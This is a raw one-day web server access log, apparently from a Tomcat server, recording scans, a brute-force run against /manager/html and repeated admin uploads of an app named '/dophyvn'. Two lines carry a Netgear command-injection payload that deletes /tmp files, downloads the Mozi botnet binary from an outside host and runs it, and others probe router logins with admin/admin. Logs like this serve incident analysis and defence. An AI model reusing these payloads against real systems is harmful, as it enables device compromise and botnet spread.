161.35.132.68 - - [24/Feb/2021:00:06:54 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 769
171.34.176.36 - - [24/Feb/2021:02:42:41 +0000] "GET / HTTP/1.1" 200 6
221.213.75.184 - - [24/Feb/2021:02:42:41 +0000] "GET / HTTP/1.1" 200 6
139.162.111.98 - - [24/Feb/2021:02:45:05 +0000] "GET / HTTP/1.1" 200 11156
172.104.242.173 - - [24/Feb/2021:02:46:08 +0000] "-" 400 2013
161.35.230.183 - - [24/Feb/2021:02:48:09 +0000] "-" 400 2017
78.158.183.152 - - [24/Feb/2021:03:00:35 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - - [24/Feb/2021:03:43:32 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - - [24/Feb/2021:03:43:37 +0000] "GET /manager/html HTTP/1.1" 401 2499
1.52.198.203 - admin [24/Feb/2021:03:43:42 +0000] "GET /manager/html HTTP/1.1" 200 17968
1.52.198.203 - - [24/Feb/2021:03:43:43 +0000] "GET /favicon.ico HTTP/1.1" 200 21630
1.52.198.203 - admin [24/Feb/2021:03:44:44 +0000] "POST /manager/html/upload;jsessionid=DE28805FE7D192DDF3C2FB940AFB1544?org.apache.catalina.filters.CSRF_NONCE=663EB78764D365B5008C2F7B690EE1E9 HTTP/1.1" 200 17848
1.52.198.203 - admin [24/Feb/2021:03:44:54 +0000] "POST /manager/html/start?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=80A41BDDA9E015E191449578D5E76FFE HTTP/1.1" 200 18139
1.52.198.203 - admin [24/Feb/2021:03:44:59 +0000] "POST /manager/html/start?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=80A41BDDA9E015E191449578D5E76FFE HTTP/1.1" 200 18139
1.52.198.203 - admin [24/Feb/2021:03:45:08 +0000] "POST /manager/html/undeploy?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=69744248354E09D0145B0FB800552066 HTTP/1.1" 200 16676
1.52.198.203 - - [24/Feb/2021:03:49:19 +0000] "GET /examples/ HTTP/1.1" 200 1126
1.52.198.203 - - [24/Feb/2021:03:49:23 +0000] "GET /host-manager/ HTTP/1.1" 302 -
1.52.198.203 - - [24/Feb/2021:03:49:23 +0000] "GET /host-manager/html HTTP/1.1" 401 2044
1.52.198.203 - - [24/Feb/2021:03:49:26 +0000] "GET /host-manager/html HTTP/1.1" 401 2044
1.52.198.203 - - [24/Feb/2021:03:49:27 +0000] "GET /favicon.ico HTTP/1.1" 200 21630
209.141.45.21 - - [24/Feb/2021:05:28:51 +0000] "GET /manager/html null" 400 1913
3.141.190.110 - - [24/Feb/2021:06:04:24 +0000] "GET / HTTP/1.1" 200 11156
144.126.217.118 - - [24/Feb/2021:06:14:00 +0000] "HEAD / null" 400 -
144.126.217.118 - - [24/Feb/2021:06:14:02 +0000] "GET /system_api.php HTTP/1.1" 404 765
144.126.217.118 - - [24/Feb/2021:06:14:04 +0000] "GET /c/version.js HTTP/1.1" 404 767
144.126.217.118 - - [24/Feb/2021:06:14:05 +0000] "GET /streaming/clients_live.php HTTP/1.1" 404 781
144.126.217.118 - - [24/Feb/2021:06:14:06 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 786
144.126.217.118 - - [24/Feb/2021:06:14:07 +0000] "GET /client_area/ HTTP/1.1" 404 767
144.126.217.118 - - [24/Feb/2021:06:14:08 +0000] "GET /stalker_portal/c/ HTTP/1.1" 404 776
2.57.122.97 - - [24/Feb/2021:06:23:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 782
103.84.241.75 - - [24/Feb/2021:06:49:06 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.84.241.75:42698/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 760
1.52.198.203 - - [24/Feb/2021:07:56:24 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - admin [24/Feb/2021:07:56:26 +0000] "GET /manager/html HTTP/1.1" 200 16603
1.52.198.203 - admin [24/Feb/2021:07:57:20 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=C6CD17F77C03C9ECB1B02DC8437D094C HTTP/1.1" 200 17848
1.52.198.203 - admin [24/Feb/2021:07:57:32 +0000] "POST /manager/html/start?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=7B3527C3A7EB45EFE96274146D08AB16 HTTP/1.1" 200 18139
61.51.77.3 - - [24/Feb/2021:08:36:38 +0000] "CONNECT myip.ipip.net:443 HTTP/1.0" 400 795
110.172.188.58 - - [24/Feb/2021:08:38:15 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - admin [24/Feb/2021:08:39:18 +0000] "POST /manager/html/undeploy?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=41F9C43F07DAE13A5C71B0147AEA176D HTTP/1.1" 403 3446
1.52.198.203 - - [24/Feb/2021:08:39:28 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - admin [24/Feb/2021:08:39:30 +0000] "GET /manager/html HTTP/1.1" 200 17848
1.52.198.203 - admin [24/Feb/2021:08:39:33 +0000] "POST /manager/html/undeploy?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=7219179CBF492AF0F938CE141282A615 HTTP/1.1" 200 16676
78.128.112.14 - - [24/Feb/2021:08:53:57 +0000] "-" 400 2025
209.141.45.21 - - [24/Feb/2021:09:36:41 +0000] "GET /manager/html null" 400 1913
167.88.7.134 - - [24/Feb/2021:09:46:10 +0000] "-" 400 2187
1.52.198.203 - - [24/Feb/2021:10:04:50 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - - [24/Feb/2021:10:04:54 +0000] "GET / HTTP/1.1" 200 11156
1.52.198.203 - admin [24/Feb/2021:10:05:22 +0000] "GET /manager/html HTTP/1.1" 200 16603
1.52.198.203 - admin [24/Feb/2021:10:07:02 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=8F85A8657BA2A552D958E5BD7A6668A3 HTTP/1.1" 200 17848
1.52.198.203 - admin [24/Feb/2021:10:07:21 +0000] "POST /manager/html/start?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=16C948519E7BC86271AD9E5D3420174E HTTP/1.1" 200 18139
1.52.198.203 - admin [24/Feb/2021:10:11:18 +0000] "POST /manager/html/start?path=/dophyvn&org.apache.catalina.filters.CSRF_NONCE=121A841C4FFD31DE4CFED45A5400FDEA HTTP/1.1" 200 18139
103.50.214.238 - - [24/Feb/2021:10:29:49 +0000] "GET / HTTP/1.1" 200 11156
89.248.172.90 - - [24/Feb/2021:11:01:52 +0000] "GET /azenv.php HTTP/1.1" 404 760
89.248.172.90 - - [24/Feb/2021:11:01:54 +0000] "-" 400 1975
89.248.172.90 - - [24/Feb/2021:11:01:55 +0000] "-" 400 1975
89.248.172.90 - - [24/Feb/2021:11:01:56 +0000] "-" 400 1949
47.112.143.106 - - [24/Feb/2021:12:42:04 +0000] "GET /login HTTP/1.0" 404 756
47.112.143.106 - - [24/Feb/2021:12:42:09 +0000] "GET /jenkins/login HTTP/1.0" 404 768
47.112.143.106 - - [24/Feb/2021:12:42:19 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:21 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:27 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:28 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:29 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:30 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:37 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:43 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:44 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:45 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:46 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:47 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:50 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:53 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:54 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:55 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:56 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:42:59 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:00 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:01 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:02 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:03 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:04 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:12 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:13 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:14 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:15 +0000] "GET /manager/html HTTP/1.1" 401 2499
47.112.143.106 - - [24/Feb/2021:12:43:16 +0000] "GET /manager/html HTTP/1.1" 401 2499
82.204.148.222 - - [24/Feb/2021:12:49:27 +0000] "GET / HTTP/1.1" 200 11156
89.248.172.90 - - [24/Feb/2021:13:09:06 +0000] "GET /azenv.php HTTP/1.1" 404 760
89.248.172.90 - - [24/Feb/2021:13:09:07 +0000] "-" 400 1975
89.248.172.90 - - [24/Feb/2021:13:09:07 +0000] "-" 400 1975
89.248.172.90 - - [24/Feb/2021:13:09:08 +0000] "-" 400 1949
116.16.152.62 - - [24/Feb/2021:13:35:55 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 760
209.141.45.21 - - [24/Feb/2021:13:37:20 +0000] "GET /manager/html null" 400 1913
23.100.53.247 - - [24/Feb/2021:16:00:58 +0000] "CONNECT ver.movistarplus.es:443 HTTP/1.1" 400 795
74.82.47.4 - - [24/Feb/2021:16:10:29 +0000] "GET / HTTP/1.1" 200 11156
185.173.35.49 - - [24/Feb/2021:17:03:31 +0000] "GET / HTTP/1.1" 200 11156
209.141.45.21 - - [24/Feb/2021:17:49:36 +0000] "GET /manager/html null" 400 1913
116.82.21.158 - - [24/Feb/2021:18:05:02 +0000] "GET /admin-scripts.asp HTTP/1.1" 404 768
116.82.21.158 - - [24/Feb/2021:18:05:02 +0000] "GET /admin-scripts.asp HTTP/1.1" 404 768
124.92.135.30 - - [24/Feb/2021:18:13:42 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 782
23.100.53.247 - - [24/Feb/2021:18:17:46 +0000] "CONNECT ver.movistarplus.es:443 HTTP/1.1" 400 795
23.100.53.247 - - [24/Feb/2021:19:03:47 +0000] "CONNECT ver.movistarplus.es:443 HTTP/1.1" 400 795
194.48.199.121 - - [24/Feb/2021:20:19:55 +0000] "GET /invoker/readonly HTTP/1.1" 404 771
45.143.221.129 - - [24/Feb/2021:20:34:31 +0000] "GET / null" 400 1913
139.162.79.87 - - [24/Feb/2021:20:46:19 +0000] "GET / HTTP/1.1" 200 11156
209.141.45.21 - - [24/Feb/2021:21:31:41 +0000] "GET /manager/html null" 400 1913
23.100.53.247 - - [24/Feb/2021:23:10:28 +0000] "CONNECT ver.movistarplus.es:443 HTTP/1.1" 400 795
167.248.133.53 - - [24/Feb/2021:23:46:18 +0000] "GET / HTTP/1.1" 200 11156
167.248.133.53 - - [24/Feb/2021:23:46:19 +0000] "GET / HTTP/1.1" 200 11156
